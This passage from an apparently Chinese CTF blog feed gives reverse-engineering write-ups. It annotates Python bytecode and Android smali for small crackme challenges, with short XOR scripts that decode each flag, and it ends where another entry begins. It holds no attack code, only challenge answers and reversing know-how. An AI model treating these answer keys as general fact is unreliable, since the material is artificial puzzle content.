class="hljs-number">149</span>, <span class="hljs-number">36</span>, <span class="hljs-number">136</span>, <span class="hljs-number">90</span>, <span class="hljs-number">142</span>, <span class="hljs-number">194</span>]<br>funcs = [<span class="hljs-keyword">lambda</span> x, y: x + y, <span class="hljs-keyword">lambda</span> x, y: x - y, <span class="hljs-keyword">lambda</span> x, y: x ^ y]<br>enc = [<span class="hljs-number">93</span>, <span class="hljs-number">382</span>, <span class="hljs-number">117</span>, -<span class="hljs-number">29</span>, <span class="hljs-number">120</span>, <span class="hljs-number">102</span>, -<span class="hljs-number">101</span>, <span class="hljs-number">426</span>, <span class="hljs-number">104</span>, -<span class="hljs-number">93</span>, <span class="hljs-number">351</span>, <span class="hljs-number">102</span>, -<span class="hljs-number">25</span>, <span class="hljs-number">116</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">415</span>, <span class="hljs-number">114</span>, <span class="hljs-number">27</span>, <span class="hljs-number">134</span>, <span class="hljs-number">101</span>, -<span class="hljs-number">18</span>, <span class="hljs-number">395</span>, <span class="hljs-number">101</span>, -<span class="hljs-number">55</span>, <span class="hljs-number">377</span>, <span class="hljs-number">117</span>, -<span class="hljs-number">37</span>, <span class="hljs-number">379</span>, <span class="hljs-number">116</span>, <span class="hljs-number">89</span>, <span class="hljs-number">143</span>, <span class="hljs-number">110</span>, -<span class="hljs-number">3</span>]<br><span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(enc):<br>    flag=flag+<span class="hljs-built_in">chr</span>((funcs[i%<span class="hljs-number">3</span>](j,salts[i]))^salts[i])<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></div></td></tr></table></figure><h1 id="看看汇编就知道啦"><a href="#看看汇编就知道啦" class="headerlink" title="看看汇编就知道啦"></a>看看汇编就知道啦</h1><p>根据组内大佬简单的分析得到了具体的代码</p><p>大佬分析的内容</p><figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap"> <span class="hljs-number"> 4 </span>         <span class="hljs-number"> 0 </span>LOAD_GLOBAL             <span class="hljs-number"> 0 </span>(len)<br>             <span class="hljs-number"> 2 </span>LOAD_FAST               <span class="hljs-number"> 0 </span>(s)  <br>             <span class="hljs-number"> 4 </span>CALL_FUNCTION           <span class="hljs-number"> 1 </span>     <br>             <span class="hljs-number"> 6 </span>STORE_FAST              <span class="hljs-number"> 1 </span>(l)<br>获取len(s)并保存在局部变量l中<br><br><br> <span class="hljs-number"> 5 </span>         <span class="hljs-number"> 8 </span>BUILD_LIST               0<br>            <span class="hljs-number"> 10 </span>STORE_FAST              <span class="hljs-number"> 2 </span>(a)<br>局部变量a=[]<br><br> <span class="hljs-number"> 6 </span>        <span class="hljs-number"> 12 </span>LOAD_GLOBAL             <span class="hljs-number"> 1 </span>(range)<br>            <span class="hljs-number"> 14 </span>LOAD_FAST               <span class="hljs-number"> 1 </span>(l)<br>            <span class="hljs-number"> 16 </span>CALL_FUNCTION            1<br>            <span class="hljs-number"> 18 </span>GET_ITER<br>        &gt;&gt;  <span class="hljs-number"> 20 </span>FOR_ITER               <span class="hljs-number"> 34 </span>(to 56)<br>            <span class="hljs-number"> 22 </span>STORE_FAST              <span class="hljs-number"> 3 </span>(i)<br>for i in range(56):<br>    a.append(ord(s)^(ord(&#x27;a&#x27;)+14))<br><br> <span class="hljs-number"> 7 </span>        <span class="hljs-number"> 24 </span>LOAD_FAST               <span class="hljs-number"> 2 </span>(a)<br>            <span class="hljs-number"> 26 </span>LOAD_METHOD             <span class="hljs-number"> 2 </span>(append)<br>            <span class="hljs-number"> 28 </span>LOAD_GLOBAL             <span class="hljs-number"> 3 </span>(ord)<br>            <span class="hljs-number"> 30 </span>LOAD_FAST               <span class="hljs-number"> 0 </span>(s)<br>            <span class="hljs-number"> 32 </span>LOAD_FAST               <span class="hljs-number"> 3 </span>(i)<br>            <span class="hljs-number"> 34 </span>BINARY_SUBSCR<br>            <span class="hljs-number"> 36 </span>CALL_FUNCTION            1<br>            <span class="hljs-number"> 38 </span>LOAD_GLOBAL             <span class="hljs-number"> 3 </span>(ord)<br>            <span class="hljs-number"> 40 </span>LOAD_CONST              <span class="hljs-number"> 1 </span>(&#x27;a&#x27;)<br>            <span class="hljs-number"> 42 </span>CALL_FUNCTION            1<br>            <span class="hljs-number"> 44 </span>BINARY_XOR<br>            <span class="hljs-number"> 46 </span>LOAD_CONST              <span class="hljs-number"> 2 </span>(14)<br>            <span class="hljs-number"> 48 </span>BINARY_ADD<br>            <span class="hljs-number"> 50 </span>CALL_METHOD              1<br>            <span class="hljs-number"> 52 </span>POP_TOP<br>            <span class="hljs-number"> 54 </span>JUMP_ABSOLUTE           20<br><br><br><br> <span class="hljs-number"> 8 </span>    &gt;&gt;  <span class="hljs-number"> 56 </span>LOAD_GLOBAL             <span class="hljs-number"> 4 </span>(print)<br>            <span class="hljs-number"> 58 </span>LOAD_FAST               <span class="hljs-number"> 2 </span>(a)<br>            <span class="hljs-number"> 60 </span>CALL_FUNCTION            1<br>            <span class="hljs-number"> 62 </span>POP_TOP<br>            <span class="hljs-number"> 64 </span>LOAD_CONST              <span class="hljs-number"> 0 </span>(None)<br>            <span class="hljs-number"> 66 </span>RETURN_VALUE<br>print(a)  <br>return None<br><br>————————————————————————————————<br>Output: [8, 23, 26, 12, 27, 9, 20, 33, 6, 8, 7, 27, 48, 12, 14, 1, 48, 0, 1, 3, 22, 48, 28, 0, 3, 25, 10, 48, 27, 7, 10, 48, 28, 6, 2, 31, 3, 10, 28, 27, 48, 6, 1, 25, 10, 29, 28, 10, 48, 31, 29, 0, 13, 3, 10, 2, 18]<br></code></pre></div></td></tr></table></figure><p>重要的在这个地方</p><p>for i in range(56):<br>    a.append(ord(s)^(ord(‘a’)+14))</p><p>之后编写简单的代码可以得到flag</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">s=<span class="hljs-string">&quot;&quot;</span><br>list1=[<span class="hljs-number">8</span>, <span class="hljs-number">23</span>, <span class="hljs-number">26</span>, <span class="hljs-number">12</span>, <span class="hljs-number">27</span>, <span class="hljs-number">9</span>, <span class="hljs-number">20</span>, <span class="hljs-number">33</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">27</span>, <span class="hljs-number">48</span>, <span class="hljs-number">12</span>, <span class="hljs-number">14</span>, <span class="hljs-number">1</span>, <span class="hljs-number">48</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">22</span>, <span class="hljs-number">48</span>, <span class="hljs-number">28</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">25</span>, <span class="hljs-number">10</span>, <span class="hljs-number">48</span>, <span class="hljs-number">27</span>, <span class="hljs-number">7</span>, <span class="hljs-number">10</span>, <span class="hljs-number">48</span>, <span class="hljs-number">28</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">31</span>, <span class="hljs-number">3</span>, <span class="hljs-number">10</span>, <span class="hljs-number">28</span>, <span class="hljs-number">27</span>, <span class="hljs-number">48</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">25</span>, <span class="hljs-number">10</span>, <span class="hljs-number">29</span>, <span class="hljs-number">28</span>, <span class="hljs-number">10</span>, <span class="hljs-number">48</span>, <span class="hljs-number">31</span>, <span class="hljs-number">29</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">3</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">18</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">56</span>):<br>    s+=<span class="hljs-built_in">chr</span>(list1[i]^(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+<span class="hljs-number">14</span>))<br><span class="hljs-built_in">print</span>(s)<br></code></pre></div></td></tr></table></figure><h1 id="看看smali就smile啦"><a href="#看看smali就smile啦" class="headerlink" title="看看smali就smile啦"></a>看看smali就smile啦</h1><p>感谢组内大佬看了很久之后得到具体算法</p><p>分析如下</p><figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali"><span class="hljs-keyword">.class</span><span class="hljs-keyword"> public</span> <span class="hljs-class">Lcom/a/sample/androidtest/MainActivity;</span><br><span class="hljs-keyword">.super</span> <span class="hljs-class">Landroid/support/v7/app/AppCompatActivity;</span><br><span class="hljs-keyword">.source</span> <span class="hljs-string">&quot;MainActivity.java&quot;</span><br>包名：Lcom/a/sample/androidtest/<br>父类：AppCompatActivity<br>父类包：Landroid/support/v7/app/<br>源文件为：MainActivity.java<br><br><span class="hljs-comment"># instance fields</span><br><span class="hljs-keyword">.field</span><span class="hljs-keyword"> private</span> editText:<span class="hljs-class">Landroid/widget/EditText;</span><br>定义了一个文本输入框<br><br><span class="hljs-keyword">.field</span><span class="hljs-keyword"> private</span> s:[B<br>定义私有变量s，类型为byte<br><br><span class="hljs-comment"># direct methods     </span><br><span class="hljs-keyword">.method</span><span class="hljs-keyword"> public</span><span class="hljs-keyword"> constructor</span> &lt;init&gt;()V<br>直接方法(权限：公有，方法原型：init，即类中构造函数)<br><br><span class="hljs-keyword">    .locals</span> 1<br><br><span class="hljs-keyword">    .prologue</span><br><span class="hljs-keyword">    .line</span> 10<br>   <span class="hljs-built_in"> invoke-direct </span>&#123;p0&#125;, <span class="hljs-class">Landroid/support/v7/app/AppCompatActivity;</span>-&gt;&lt;init&gt;()V<br>    调用AppCompatActivity类中的init()方法，传入参数为p0<br><br><span class="hljs-keyword">    .line</span> 12<br>   <span class="hljs-built_in"> const/16 </span>v0, 0x1f<br><br>   <span class="hljs-built_in"> new-array </span>v0, v0, [B<br>    指定了构造类型为byte(字节型)的大小为31的数组并赋值给存储器v0<br><br>   <span class="hljs-built_in"> fill-array-data </span>v0,<span class="hljs-keyword"> :array_0</span><br>    用指定数据array_0来填充寄存器v0中的数组(应该是空的意思)<br><br>   <span class="hljs-built_in"> iput-object </span>v0, p0, <span class="hljs-class">Lcom/a/sample/androidtest/MainActivity;</span>-&gt;s:[B<br>    将寄存器v0中指定的对象(数组)赋值给寄存器p0中指向的MainActivity的对象<br><br>   <span class="hljs-built_in"> return-void</span><br><span class="hljs-built_in"></span><br>   <span class="hljs-built_in"> nop</span><br><span class="hljs-built_in"></span><br>   <span class="hljs-keyword"> :array_0</span><br><span class="hljs-keyword">    .array</span>-data 1<br>        0x75t<br>        0x6at<br>        0x67t<br>        0x71t<br>        0x66t<br>        0x74t<br>        0x69t<br>        0x57t<br>        0x73t<br>        0x61t<br>        0x6bt<br>        0x4dt<br>        0x52t<br>        0x7ct<br>        0x76t<br>        0x60t<br>        0x7dt<br>        0x23t<br>        0x76t<br>        0x4dt<br>        0x43t<br>        0x67t<br>        0x77t<br>        0x61t<br>        0x66t<br>        0x7bt<br>        0x7dt<br>        0x7ct<br>        0x6ft<span class="hljs-keyword"></span><br><span class="hljs-keyword">    .end array</span>-data<span class="hljs-keyword"></span><br><span class="hljs-keyword">.end method</span><br><br><br><span class="hljs-comment"># virtual methods</span><br><span class="hljs-keyword">.method</span><span class="hljs-keyword"> public</span> check()Z<br><span class="hljs-keyword">    .locals</span> 5<br>    公有的虚方法check()<br><br><span class="hljs-keyword">    .prologue</span><br>   <span class="hljs-built_in"> const/4 </span>v2, 0x0<br>    定义变量v2，赋值为0<br><br><span class="hljs-keyword">    .line</span> 15<br>   <span class="hljs-built_in"> iget-object </span>v3, p0, <span class="hljs-class">Lcom/a/sample/androidtest/MainActivity;</span>-&gt;editText:<span class="hljs-class">Landroid/widget/EditText;</span><br>    定义一个数组变量v3(准确点应该是字符串，字符串也是种数组)<br><br>   <span class="hljs-built_in"> invoke-virtual </span>&#123;v3&#125;, <span class="hljs-class">Landroid/widget/EditText;</span>-&gt;getText()<span class="hljs-class">Landroid/text/Editable;</span><br>    调用getText()方法获取输入框中的内容并传入v3<br><br>   <span class="hljs-built_in"> move-result-object </span>v3<br>    getText()方法的返回值存放在寄存器v3中<br><br>   <span class="hljs-built_in"> invoke-virtual </span>&#123;v3&#125;, <span class="hljs-class">Ljava/lang/Object;</span>-&gt;toString()<span class="hljs-class">Ljava/lang/String;</span><br>    调用toString()方法获取返回值的字符串形式<br><br>   <span class="hljs-built_in"> move-result-object </span>v3<br>    将返回值的字符串形式存放在v3中<br><br>   <span class="hljs-built_in"> invoke-virtual </span>&#123;v3&#125;, <span class="hljs-class">Ljava/lang/String;</span>-&gt;getBytes()[B<br>    调用getBytes()方法将字符串转化为字节流形式<br><br>   <span class="hljs-built_in"> move-result-object </span>v0<br>    将字符串转化的字节流内容存放在v0中<br><br><span class="hljs-keyword">    .line</span> 16<br><span class="hljs-keyword">    .local</span> v0, <span class="hljs-string">&quot;chars&quot;</span>:[B<br>   <span class="hljs-built_in"> array-length </span>v3, v0<br>    获取v0寄存器中数组长度并存放在v3中<br><br>   <span class="hljs-built_in"> iget-object </span>v4, p0, <span class="hljs-class">Lcom/a/sample/androidtest/MainActivity;</span>-&gt;s:[B<br>    将p0寄存器中的引用值给v4寄存器<br><br>   <span class="hljs-built_in"> array-length </span>v4, v4<br>    将v4的数组长度值存在v4寄存器<br><br>   <span class="hljs-built_in"> if-eq </span>v3, v4,<span class="hljs-keyword"> :cond_1</span><br>    如果v3寄存器的值与v4寄存器的值长度相同则跳转至:cond_1处<br><br><span class="hljs-keyword">    .line</span> 22<br>   <span class="hljs-keyword"> :cond_0</span><br>   <span class="hljs-keyword"> :goto_0</span><br>   <span class="hljs-built_in"> return </span>v2<br>    返回v2的值<br><br><span class="hljs-keyword">    .line</span> 18<br>   <span class="hljs-keyword"> :cond_1</span><br>   <span class="hljs-built_in"> const/4 </span>v1, 0x0<br>    将v1的值赋为0<br><br><span class="hljs-keyword">    .local</span> v1, <span class="hljs-string">&quot;i&quot;</span>:I<br>   <span class="hljs-keyword"> :goto_1</span><br>    goto_1模块<br>   <span class="hljs-built_in"> iget-object </span>v3, p0, <span class="hljs-class">Lcom/a/sample/androidtest/MainActivity;</span>-&gt;s:[B<br>    从p0中读一个实例变量到v3中<br><br>   <span class="hljs-built_in"> array-length </span>v3, v3<br>    v3中存放数组长度<br><br>   <span class="hljs-built_in"> if-ge </span>v1, v3,<span class="hljs-keyword"> :cond_2</span><br>    如果v1寄存器中的数值(0)大于v3寄存器的数值则跳转到<span class="hljs-keyword"> :cond_2</span>模块<br><br>   <span class="hljs-built_in"> array-length </span>v3, v0<br>    将v0寄存器数组的长度(29)传到v3寄存器中<br><br>   <span class="hljs-built_in"> if-ge </span>v1, v3,<span class="hljs-keyword"> :cond_2</span><br>    如果v1寄存器中的数值大于v3寄存器的数值(29)则跳转到<span class="hljs-keyword"> :cond_2</span>模块<br><br><span class="hljs-keyword">    .line</span> 19<br>   <span class="hljs-built_in"> iget-object </span>v3, p0, <span class="hljs-class">Lcom/a/sample/androidtest/MainActivity;</span>-&gt;s:[B<br>    <br><br>   <span class="hljs-built_in"> aget-byte </span>v3, v3, v1<br>    将<br><br>   <span class="hljs-built_in"> aget-byte </span>v4, v0, v1<br><br>   <span class="hljs-built_in"> xor-int/lit8 </span>v4, v4, 0x12<br>    将寄存器v4的内容与18异或后放回v4<br><br>   <span class="hljs-built_in"> if-ne </span>v3, v4,<span class="hljs-keyword"> :cond_0</span><br>    如果v3和v4不相同则跳转到<span class="hljs-keyword"> :cond_0</span>模块<br><br><span class="hljs-keyword">    .line</span> 18<br>   <span class="hljs-built_in"> add-int/lit8 </span>v1, v1, 0x1<br>    v1的值加一后存入v1<br><br>   <span class="hljs-built_in"> goto </span>:goto_1<br><br><span class="hljs-keyword">    .line</span> 22<br>   <span class="hljs-keyword"> :cond_2</span><br>   <span class="hljs-built_in"> const/4 </span>v2, 0x1<br>    v2的值赋为1<br><br>   <span class="hljs-built_in"> goto </span>:goto_0<span class="hljs-keyword"></span><br><span class="hljs-keyword">.end method</span><br><br><span class="hljs-keyword">.method</span><span class="hljs-keyword"> protected</span> onCreate(<span class="hljs-class">Landroid/os/Bundle;</span>)V<br>调用protected类型的onCreate()方法<br><br><span class="hljs-keyword">    .locals</span> 3<br><span class="hljs-keyword">    .param</span> p1, <span class="hljs-string">&quot;savedInstanceState&quot;</span>    <span class="hljs-comment"># Landroid/os/Bundle;</span><br>    定义变量p1为<span class="hljs-string">&quot;savedInstanceState&quot;</span><br><br><span class="hljs-keyword">    .prologue</span><br><span class="hljs-keyword">    .line</span> 27<br>   <span class="hljs-built_in"> invoke-super </span>&#123;p0, p1&#125;, <span class="hljs-class">Landroid/support/v7/app/AppCompatActivity;</span>-&gt;onCreate(<span class="hljs-class">Landroid/os/Bundle;</span>)V<br>    将p0和p1的值传入父类AppCompatActivity的onCreate()方法中<br><br><span class="hljs-keyword">    .line</span> 28<br>   <span class="hljs-built_in"> const </span>v1, 0x7f04001b<br>    将0x7f04001b放入v1寄存器中(猜测是数组的头指针)<br><br>   <span class="hljs-built_in"> invoke-virtual </span>&#123;p0, v1&#125;, <span class="hljs-class">Lcom/a/sample/androidtest/MainActivity;</span>-&gt;setContentView(I)V<br>    将变量p0和v1传入方法setContentView()中<br><br><span class="hljs-keyword">    .line</span> 30<br>   <span class="hljs-built_in"> move-object </span>v0, p0<br>    将p0寄存器的值赋给v0寄存器<br><br><span class="hljs-keyword">    .line</span> 32<br><span class="hljs-keyword">    .local</span> v0, <span class="hljs-string">&quot;context&quot;</span>:<span class="hljs-class">Landroid/content/Context;</span><br>   <span class="hljs-built_in"> const </span>v1, 0x7f0b0057<br>    将0x7f0b0057放入v1寄存器中(猜测是数组的头指针)<br><br>   <span class="hljs-built_in"> invoke-virtual </span>&#123;p0, v1&#125;, <span class="hljs-class">Lcom/a/sample/androidtest/MainActivity;</span>-&gt;findViewById(I)<span class="hljs-class">Landroid/view/View;</span><br>    调用类MainActivity中的findViewById()函数，传入的值为p0和p1<br><br>   <span class="hljs-built_in"> move-result-object </span>v1<br>    获取函数的返回值并存放在v1寄存器中<br><br>   <span class="hljs-built_in"> check-cast </span>v1, <span class="hljs-class">Landroid/widget/EditText;</span><br>    v1寄存器的引用转化为EditText类型<br><br>   <span class="hljs-built_in"> iput-object </span>v1, p0, <span class="hljs-class">Lcom/a/sample/androidtest/MainActivity;</span>-&gt;editText:<span class="hljs-class">Landroid/widget/EditText;</span><br>    将v1寄存器中的引用赋给p0(EditText类型)<br><br><span class="hljs-keyword">    .line</span> 34<br>   <span class="hljs-built_in"> const </span>v1, 0x7f0b0058<br>    将地址0x7f0b0058的内容赋值给v1(猜测是将EditText的内容赋值给v1)<br><br>   <span class="hljs-built_in"> invoke-virtual </span>&#123;p0, v1&#125;, <span class="hljs-class">Lcom/a/sample/androidtest/MainActivity;</span>-&gt;findViewById(I)<span class="hljs-class">Landroid/view/View;</span><br>    调用虚方法findViewById()，传入的参数是p0和v1<br><br>   <span class="hljs-built_in"> move-result-object </span>v1<br><br>   <span class="hljs-built_in"> new-instance </span>v2, <span class="hljs-class">Lcom/a/sample/androidtest/MainActivity$1;</span><br>    构造MainActivity类的实例对象，并将其存放在v2寄存器中<br><br>   <span class="hljs-built_in"> invoke-direct </span>&#123;v2, p0, v0&#125;, <span class="hljs-class">Lcom/a/sample/androidtest/MainActivity$1;</span>-&gt;&lt;init&gt;(<span class="hljs-class">Lcom/a/sample/androidtest/MainActivity;</span><span class="hljs-class">Landroid/content/Context;</span>)V<br><br>   <span class="hljs-built_in"> invoke-virtual </span>&#123;v1, v2&#125;, <span class="hljs-class">Landroid/view/View;</span>-&gt;setOnClickListener(<span class="hljs-class">Landroid/view/View$OnClickListener;</span>)V<br>    鼠标监听，判断是否点击<br><br><span class="hljs-keyword">    .line</span> 44<br>   <span class="hljs-built_in"> return-void</span><br><span class="hljs-built_in"></span><span class="hljs-keyword">.end method</span><br><br><br><br>ujgqftiWsakMRIv`&#125;<span class="hljs-comment">#vMCgwaf&#123;&#125;Io</span><br></code></pre></div></td></tr></table></figure><p>较为重要的地方是那个array内容和后面的 <strong>将寄存器v4的内容与18异或后放回v4</strong></p><p>编写对应的python脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">ls=[<span class="hljs-string">&#x27;0x75&#x27;</span>, <span class="hljs-string">&#x27;0x6a&#x27;</span>, <span class="hljs-string">&#x27;0x67&#x27;</span>, <span class="hljs-string">&#x27;0x71&#x27;</span>, <span class="hljs-string">&#x27;0x66&#x27;</span>, <span class="hljs-string">&#x27;0x74&#x27;</span>, <span class="hljs-string">&#x27;0x69&#x27;</span>, <span class="hljs-string">&#x27;0x57&#x27;</span>, <span class="hljs-string">&#x27;0x73&#x27;</span>, <span class="hljs-string">&#x27;0x61&#x27;</span>, <span class="hljs-string">&#x27;0x6b&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x52&#x27;</span>, <span class="hljs-string">&#x27;0x7c&#x27;</span>, <span class="hljs-string">&#x27;0x76&#x27;</span>, <span class="hljs-string">&#x27;0x60&#x27;</span>, <span class="hljs-string">&#x27;0x7d&#x27;</span>, <span class="hljs-string">&#x27;0x23&#x27;</span>, <span class="hljs-string">&#x27;0x76&#x27;</span>, <span class="hljs-string">&#x27;0x4d&#x27;</span>, <span class="hljs-string">&#x27;0x43&#x27;</span>, <span class="hljs-string">&#x27;0x67&#x27;</span>, <span class="hljs-string">&#x27;0x77&#x27;</span>, <span class="hljs-string">&#x27;0x61&#x27;</span>, <span class="hljs-string">&#x27;0x66&#x27;</span>, <span class="hljs-string">&#x27;0x7b&#x27;</span>, <span class="hljs-string">&#x27;0x7d&#x27;</span>, <span class="hljs-string">&#x27;0x7c&#x27;</span>, <span class="hljs-string">&#x27;0x6f&#x27;</span>]<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ls:<br>    flag=flag+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^<span class="hljs-number">18</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></div></td></tr></table></figure><p>运行后可以得到flag</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GXUCTF-1 MISC</title>
    <link href="/2021/10/18/%E4%BF%A1%E5%AE%89/CTF/Misc/GXUCTF-1%20MISC/"/>
